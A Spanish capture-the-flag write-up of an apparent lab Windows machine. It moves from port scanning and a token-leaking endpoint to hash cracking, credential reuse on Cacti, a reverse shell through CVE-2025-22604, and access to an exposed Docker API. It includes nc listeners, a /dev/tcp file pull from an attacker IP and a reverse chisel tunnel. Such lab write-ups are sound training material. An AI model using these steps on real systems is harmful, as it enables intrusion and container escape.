OS: Windows

# Enumeración

Miramos los puertos abiertos:

```ruby
sudo nmap 10.129.4.135 -p- --min-rate 5000 -sS -Pn -n -oN ports
```

```ruby
# Nmap 7.99 scan initiated Mon May 25 00:13:10 2026 as: /usr/lib/nmap/nmap --privileged -oX - -p- --min-rate 5000 -sS -Pn -n -oN /home/juan/Hacking/nmap/ports 10.129.4.135
Nmap scan report for 10.129.4.135
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

# Nmap done at Mon May 25 00:13:37 2026 -- 1 IP address (1 host up) scanned in 26.71 seconds

```

Ahora haremos un escaneo preciso a cada puerto encontrado:

```ruby
sudo nmap 10.129.4.135 -p80,5985 -sCV -T5 -vvv -oN Exact_scan
```

```ruby
# Nmap 7.99 scan initiated Mon May 25 00:13:37 2026 as: /usr/lib/nmap/nmap --privileged -oX - -p80,5985 -sCV -T5 -vvv -oN /home/juan/Hacking/nmap/Exact_scan 10.129.4.135
Nmap scan report for 10.129.4.135
Host is up, received echo-reply ttl 127 (0.18s latency).
Scanned at 2026-05-25 00:13:39 EDT for 12s

PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 25 00:13:51 2026 -- 1 IP address (1 host up) scanned in 14.07 seconds

```

Vemos que hay una pagina web, vamos a echarle un vistazo:

![[Pasted image 20260524231904.png]]

El unico botón que hace algo es Login, pero no encontré ninguna vulneerrabilidad (como SQLi, XXE, u otras):

![[Pasted image 20260524232011.png]]


Como no encontramos nada demasiado interesante en la pagina pdoemos intentar un fuzzing:

![[Pasted image 20260524232418.png]]

Vemos una sección con un Size diferente a todos los demás, por lo que podemos echarle un ojo:

![[Pasted image 20260524232532.png]]

La pagina nos dice "Missing token parameter", esto se puede referir a un token CSRF o aún m,as interesante, un parametro que literalmente se llame token, intentemos ponerlo en la url:

![[Pasted image 20260524232811.png]]

Vemos que ahora nos dice invalid token, tenemos que encontrar cual puede se run token valido, intentemos con un numero, por ejemplo 0:

![[Pasted image 20260524232925.png]]

Perfecto, tenemos información, intentemos ordenarlo un poco, aprovechando que estaba en formato ""lista de diccionarios"", era perfecto para tratarlo con python, por lo que cree el siguiente simple script:

![[Pasted image 20260524234017.png]]

Obteniendo lo siguiente:

```ruby
########################################

id: 2
username: admin
email: admin@monitorsfour.htb
password: 56b32eb43e6f15395f6c46c1c9e1cd36
role: super user
token: 8024b78f83f102da4f
name: Marcus Higgins
position: System Administrator
dob: 1978-04-26
start_date: 2021-01-12
salary: 320800.00

########################################

id: 5
username: mwatson
email: mwatson@monitorsfour.htb
password: 69196959c16b26ef00b77d82cf6eb169
role: user
token: 0e543210987654321
name: Michael Watson
position: Website Administrator
dob: 1985-02-15
start_date: 2021-05-11
salary: 75000.00

########################################

id: 6
username: janderson
email: janderson@monitorsfour.htb
password: 2a22dcf99190c322d974c8df5ba3256b
role: user
token: 0e999999999999999
name: Jennifer Anderson
position: Network Engineer
dob: 1990-07-16
start_date: 2021-06-20
salary: 68000.00

########################################

id: 7
username: dthompson
email: dthompson@monitorsfour.htb
password: 8d4a7e7fd08555133e056d9aacb1e519
role: user
token: 0e111111111111111
name: David Thompson
position: Database Manager
dob: 1982-11-23
start_date: 2022-09-15
salary: 83000.00
```

Las contraseñas parecen estar encriptadas en algo como MD4 o MD5, intentemos crackearlas con  john, pero antes tenemos que poner solo los hashes en un archivo, lo podemos hacer con algunos comandos de bash:

![[Pasted image 20260524234515.png]]

Ahora crackeamos estos hashes, primero intenté con MD4, al no funcionar probé con MD5, lo caul me dio como resultado la contraseña ***wonderful1*** para el hash `56b32eb43e6f15395f6c46c1c9e1cd36`

![[Pasted image 20260524234452.png]]

Esta contraseña es del usuario `admin`, probamos las credenciales en la pagina de login:

![[Pasted image 20260524235215.png]]

Entramos a un panel que parece ser administrativo:

![[Pasted image 20260524235252.png]]

Revisando este panel de entrada no encontramos mucho, por lo que podemos hacer una busqueda de subdominios:

![[Pasted image 20260524235823.png]]

Lo anotamos en nuestro ***`/etc/hosts`*** y revisamos la pagina:

![[Pasted image 20260525000340.png]]

intenté usar las creedenciales de monitorsfour pero parece que no son permitidas, aunque hay algo mas que podemos intentar, vi un patron claro en como eran los usernames y correspondian con los nombres completos d elos empleados, por ejemplo (Username: mwatson 	Nombre: Michael Watson)

El administrador se llama Marcus Higgins, entonces podemos intentar con marcus, higgins o mhiggins, por suerte, con marcus funcionó:

![[Pasted image 20260525000646.png]]

Esta version de cacti es 1.2.28, que investigando un poco es vulnerable a [CVE-2025-22604](https://www.cve.news/cve-2025-22604/), un RCE!!, interesante...

Primero nos ponemos a la escucha:

```r
sudo nc -lvnp 4444
```

Ahora ejecutamos el exploit que nos dará la reverseshell:

![[Pasted image 20260525005840.png]]

ya dentro de la maquina vemos 2 cosas interesantes, lo primero es que gracias al hostname (821fbd6a43fa) nos damos cuenta de que probablemente estemos en un docker, lo podemos confirmar viendo la existencia del archivo ***`/.dockerenv`***.

Además en el directorio ***`/home`*** encontramos el homedirectory del usuario marcus, del cual tenemos permisos de lectura, entremos a la carpeta a ver que contiene:

![[Pasted image 20260525010456.png]]

Teniendo en cuenta que estamos en un contenedor que a su ves esté siendo ejecutado en un WSL2 (porque estamos en una maquina windows), lo mas probable es que por detras se esté desplegando Docker Desktop, buscando de forma rapida encontre lo siguiente:

![[Pasted image 20260525234134.png]]

Parece que hay una vulnerabilidad catalogada como [CVE-2025-9074](https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/), que basicamente consiste en que la API de docker está expuesta para el contenedor accediendo a la subnet interna por defecto (192.168.65.7:2375), intentemos v er si podemos interactuar con esta API para confirmar la vulnerabilidad, podemos usar curl:

```bash
curl http://192.168.65.7:2375/version
```

![[Pasted image 20260526000656.png]]

Interactuar con la API de docker es basicamente tener control total sobre crear contenedores, eliminarlos y administrarlos, basicamente todo lo que puedes llegar a  hacer con por ejemplo el comando docker (Docker CLI), esto es porque el comando docker o el propio docker desktop no hacen mas que interactuar con esta API REST, hay dos opciones en este caso:

1. Pivotear nuestras conexiones y usar el comando de docker en nuestra maquina atacante para que interactue con esta api expuesta

2. Hacer las peticiones directamente con curl

# Pivoting con Chisel

#### Trasferir chisel

***`En maquina atacante`***:

```ruby
nc -lvnp 8888 < chisel
```

***`En maquina victima`***:

```ruby
cat < /dev/tcp/{IP_ATACANTE}/{PUERTO} > chisel 
```

# Establecer tunel

***`En maquina atacante`***:

```ruby
sudo chisel server --reverse -p 9090
```

**`!!IMPORTANTE!!`**:  Establecer al final de /etc/proxychains4.conf y  /etc/proxychains4.conf la linea:

```ruby
socks5   127.0.0.1   1080
```

***`En maquina victima`***:

```ruby
./chisel client {IP_TACANTE}:9090
```

El resultado deberia verse asi:

![[Pasted image 20260526003359.png]]

![[Pasted image 20260526003326.png]]

Ahora podemos usar proxychains, comprobemos que todo esté funcionando correctamente:

![[Pasted image 20260526003610.png]]

Como podemos ver, el tunel está funcionando perfectamente, intentemos usar el coamndo docker para interactuar con esta API y ejecutar comandos en el sistema host:



